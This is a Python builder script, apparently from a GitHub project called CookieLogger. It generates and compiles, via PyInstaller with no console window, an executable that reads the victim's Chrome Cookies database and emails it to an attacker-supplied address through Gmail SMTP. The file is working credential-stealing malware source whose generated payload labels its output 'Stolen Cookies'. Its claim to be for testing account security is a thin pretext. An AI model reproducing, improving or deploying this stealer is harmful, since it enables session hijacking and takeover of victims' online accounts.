from colorama import Fore, Back, Style, init
import time
import os
import subprocess

import smtplib
import email
import getpass

email = ""
password = ""
semail = ""
correct = ""
version = "Beta 1.0"

Infos = "CookieLogger is a tool I made using Python to test the online accounts security.\n This script can extract the Cookies file from a PC and send it to you via e-mail."

def cls():
    os.system('cls')

def select():
    global choose
    print("Choose an action:")
    print("1. Info")
    print("2. Configure CookieLogger")
    print("3. Exit")

    choose = input()
    cls()

def code():
    global email, password, semail
    with open("CLScript.py", "w") as f:
        f.write("""
#The developer is not responsible for any use made with this script
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import getpass

username = getpass.getuser()

#INSERT DATA HERE
email_user = '""" + email + """'         #The e-mail adress to use to send the cookie file (less secure apps enabled)
email_password = '""" + password + """'     #The password of the e-mail above
email_send = '""" + semail + """'         #The e-mail adress to recive the cookie file (can be the same as the first)

subject = 'subject'

msg = MIMEMultipart()
msg['From'] = email_user
msg['To'] = email_send
msg['Subject'] = subject

body = 'Stolen Cookies EZPZ:'
msg.attach(MIMEText(body,'plain'))

filename = str("C:/Users/" + username + "/AppData/Local/Google/Chrome/User Data/Default/Cookies")
attachment = open(filename, 'rb')

part = MIMEBase('application','x-sqlite3')
part.set_payload(attachment.read())
encoders.encode_base64(part)
part.add_header('Content-Disposition',"attachment; filename= "+filename)

msg.attach(part)
text = msg.as_string()
server = smtplib.SMTP('smtp.gmail.com',587)
server.starttls()
server.login(email_user,email_password)


server.sendmail(email_user,email_send,text)
server.quit()
        """)

def setup():
    global email, password, semail
    while True:
        print("Enter the e-mail adress to send the Cookie file from (must be Gmail)")
        email = input()
        if "@gmail.com" not in email:
            print(Fore.RED + "Invalid e-mail adress, must be Gmail (example@gmail.com)")
            input()
            cls()
        else:
            break
    print("Enter the password of the Gmail account")
    password = input()
    print("Enter the e-mail adress to recive the Cookie file")
    semail = input()
    cls()

    print(Fore.GREEN + "Setup completed, press ENTER to start compiling")
    input()
    cls()
    print("Coding a python file...")
    code()
    time.sleep(1)
    print("Building an executable file...")
    subprocess.call(r"pyinstaller --noconsole --onefile --workpath ./Temp --name CookieLogger CLScript.py")
    cls()
    print(Fore.GREEN + "Compiled successfully! The script can be close.")
    print("Compiled using Pyinstaller")



init(autoreset=True)

print(Fore.RED + """

░█████╗░░█████╗░░█████╗░██╗░░██╗██╗███████╗██╗░░░░░░█████╗░░██████╗░░██████╗░███████╗██████╗░
██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██║██╔════╝██║░░░░░██╔══██╗██╔════╝░██╔════╝░██╔════╝██╔══██╗
██║░░╚═╝██║░░██║██║░░██║█████═╝░██║█████╗░░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
██║░░██╗██║░░██║██║░░██║██╔═██╗░██║██╔══╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
╚█████╔╝╚█████╔╝╚█████╔╝██║░╚██╗██║███████╗███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
░╚════╝░░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝╚══════╝╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝
""")
time.sleep(0.5)

print(Fore.LIGHTGREEN_EX + Style.BRIGHT + "https://github.com/maxwell260/CookieLogger")
print(version)
print()
time.sleep(0.5)
print(Fore.YELLOW + "Checking for dependeces...")
try:
    import smtplib
    print("smtplib...   " + Fore.GREEN + "OK")
except:
    print(Fore.RED + "smtplib must be installed, can i install it for you?  y/n")
    yon = input()
    if yon == 'y':
        subprocess.call('pip install smtplib')
    else:
        print(Fore.RED + "smtplib not installed, exiting program...")
        input()
        exit()

try:
    import email
    print("email...   " + Fore.GREEN + "OK")
except:
    print(Fore.RED + "email must be installed, can i install it for you?  y/n")
    yon = input()
    if yon == 'y':
        subprocess.call('pip install email')
    else:
        print(Fore.RED + "email not installed, exiting program...")
        input()
        exit()
        
try:
    import getpass
    print("getpass...   " + Fore.GREEN + "OK")
except:
    print(Fore.RED + "getpass must be installed, can i install it for you?  y/n")
    yon = input()
    if yon == 'y':
        subprocess.call('pip install getpass')
    else:
        print(Fore.RED + "getpass not installed, exiting program...")
        input()
        exit()

while True:
    select()
    if choose == '1':
        cls()
        print("CookieLogger  Version " + version + "  Author maxwell  https://github.com/maxwell260/CookieLogger")
        input()
        cls()
    elif choose == '2':
        setup()
    elif choose == '3':
        exit()
    else:
        print(Fore.RED + "Invalid option")
        input()